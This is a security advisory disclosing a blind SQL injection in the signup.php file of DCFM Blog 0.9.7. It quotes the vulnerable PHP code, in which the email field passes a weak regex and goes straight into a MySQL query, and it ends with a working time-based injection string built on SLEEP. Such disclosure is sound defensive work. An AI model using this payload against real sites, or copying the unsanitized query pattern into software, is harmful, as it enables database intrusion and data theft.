================================================================================


Description
============

Open-source blog project. Free blog system for any website. Uses MySQL and PHP 5. Very easily customizable and incredibly flexible.

https://sourceforge.net/projects/dcfm-blog/




Vulnerability
==============

A blind SQL Injection is possible within the signup.php file of DCFM Blog version 0.9.7.



$desuser = $_POST[&#039;desuser&#039;];
$despass = $_POST[&#039;despass&#039;];
$email = $_POST[&#039;email&#039;];                      <---- The vulnerable variable
$firstname = $_POST[&#039;firstname&#039;];
$lastname = $_POST[&#039;lastname&#039;];
$submitted = $_POST[&#039;submitted&#039;];
$despassconfirm = $_POST[&#039;despassconfirm&#039;];



The $email variable is not properly checked as the regex does not stop additional characters from being added once the variable matches a valid email format:

if(!ereg("^.+@.+\\..+$",$email)) {
      $evil = 1;
      $error="<p>
      The highlighted fields are not filled out correctly.
      </p>";      




The crafted string is fed directly into the MySql database:

$result = mysql_query("SELECT * FROM accounts
    WHERE Email=&#039;$_POST[email]&#039;");
    while($row = mysql_fetch_array($result)) {
      if ($email == $row[&#039;Email&#039;])




Proof Of Concept Exploit String
================================



Fill out the whole form and input the email variable as follows:

jimmy@site.com&#039; AND (SELECT * FROM (SELECT(SLEEP(5)))MXKf) AND &#039;dBWQ&#039;=&#039;dBWQ

